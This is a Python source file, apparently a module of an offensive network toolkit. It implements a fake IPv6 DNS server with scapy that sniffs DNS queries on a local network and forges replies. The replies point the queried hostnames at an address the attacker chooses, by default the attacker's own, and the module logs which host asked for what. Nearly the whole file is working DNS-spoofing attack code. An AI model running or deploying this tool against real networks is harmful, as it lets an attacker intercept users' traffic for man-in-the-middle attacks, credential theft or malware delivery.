from deadbeef_modules import ipv6module

from scapy.all import *

from socket import getservbyport,  gethostbyname,  getaddrinfo,  AF_INET6,  IPPROTO_IP, AI_CANONNAME

IPV6_QUERY = 28
IPV4_QUERY = 1

# creates a fake ipv6 dns server
class ipv6_fakedns_module(ipv6module):          
        """
        act as a small ipv6 fake dns server. sniff for dns requests and answer with the given ip address (default: yout ip)
        """
    
        def init_module(self):
            self.orig_prompt = self.prompt
            self.prompt = self.cc.prompt(self.prompt, 'fake dns')                       
            self.valid_parameters = ['spoofip6', 'spoofip4', 'iface',  'hostnames']
            self.help_parameters['spoofip4'] = "answer with this ipv4 address for ipv4 dns requests (default=resolve)"
            self.help_parameters['spoofip6'] = "answer every dns request with this ipv6 address (default = your ip)"
            self.help_parameters['hostnames'] = "spoof requests to this hostnames (comma seperated, default = all)"
            self.help_parameters['iface'] = "use this interface"
            self.required_parameters = ['iface']    
            
        def help(self):
            print "setup a small fake ipv6/ipv4 dns server"
                        
        def mkdnsresponse6(self,  request,  spoof_ip):               
                dns_rr = DNSRR(rrname=request.qd.qname,  ttl=220,  type= 28,  rdlen=16,  rdata=spoof_ip)                                
                response = DNS(id=request.id,  qr=1L, rd=1, ra=1, qdcount=1,  ancount=1,  qd=request.qd,  an=dns_rr)
                return response

        def mkdnsresponse4(self,  request,  spoof_ip):               
                dns_rr = DNSRR(rrname=request.qd.qname,  ttl=220,  type= 1,  rdlen=4,  rdata=spoof_ip)                                
                response = DNS(id=request.id,  qr=1L, rd=1, ra=1, qdcount=1,  ancount=1,  qd=request.qd,  an=dns_rr)
                return response

        def handle_dns_req(self,  pkt):
                if pkt.getlayer(DNS) and pkt[DNS].qd and not pkt[DNS].an:

                    # should this hostname be spoofed?
                    if 'hostnames' in self.parameters.keys():
                        if not pkt[DNS].qd.qname.rstrip('.') in self.parameters['hostnames'].split(','):
                            # return original ip address

                            # is this an ipv6 request?
                            if pkt[DNS].qd.qtype == IPV6_QUERY:                               
                                try:                                    
                                    valid_ip = getaddrinfo(pkt[DNS].qd.qname, None, AF_INET6, IPPROTO_IP, AI_CANONNAME)[0][4][0]
                                    response = self.mkdnsresponse6(pkt[DNS],  valid_ip)  
                                    p = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)/UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)/response  
                                except:
                                    p = None
                            
                            # is this an ipv4 request?
                            if pkt[DNS].qd.qtype == IPV4_QUERY:
                                try:
                                    valid_ip = gethostbyname(pkt[DNS].qd.qname)
                                    response = self.mkdnsresponse4(pkt[DNS],  valid_ip)  
                                    p = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)/UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)/response  
                                except:
                                    p = None                                                                                             
                            
                            if p:
                                send(p,  verbose=0)                             
                                return
                                                
                    # is it an ipv5 query?
                    if pkt[DNS].qd.qtype == IPV4_QUERY:                    
                        # should we spoof ipv4 querys as well?
                        if 'spoofip4' in self.parameters.keys():                        
                            # spoof!
                            spoof_ip = self.parameters['spoofip4']
                            self.log("%s is looking for %s. spoofing with %s.\n" % (pkt[IPv6].src, pkt[DNS].qd.qname,  spoof_ip))
                            response = self.mkdnsresponse4(pkt[DNS],  spoof_ip)  
                            p = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)/UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)/response  
                        else:
                            # get real ip address of IPv4 Query
                            try:
                                valid_ip = gethostbyname(pkt[DNS].qd.qname)
                                response = self.mkdnsresponse4(pkt[DNS],  valid_ip)  
                                p = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)/UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)/response  
                            except:
                                p = None     
                    else:
                        # it is an ipv6 query                    
                        if 'spoofip6' in self.parameters.keys():
                            spoof_ip = self.parameters['spoofip6']
                        else:
                            spoof_ip = pkt[IPv6].dst
                        
                        self.log("%s is looking for %s. spoofing with %s.\n" % (pkt[IPv6].src, pkt[DNS].qd.qname,  spoof_ip))
                        response = self.mkdnsresponse6(pkt[DNS],  spoof_ip)  
                        p = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)/UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)/response  
                        
                    if p:
                        send(p,  verbose=0)

        def start(self, cmdline):           
            conf.iface6 = self.parameters['iface']
            conf.iface = self.parameters['iface']
            
            self.cc.ok("starting ipv6 dns server server...\n")      
            
            arguments = {'prn': self.handle_dns_req, 'filter': 'port 53 and udp and ip6', 'iface': conf.iface6}         
            self.add_job(cmd = sniff, kwargs = arguments)

        def stop(self, cmdline):
            self.cc.ok("stopping ipv6 dns server server...\n")      
            
            self.kill_job()
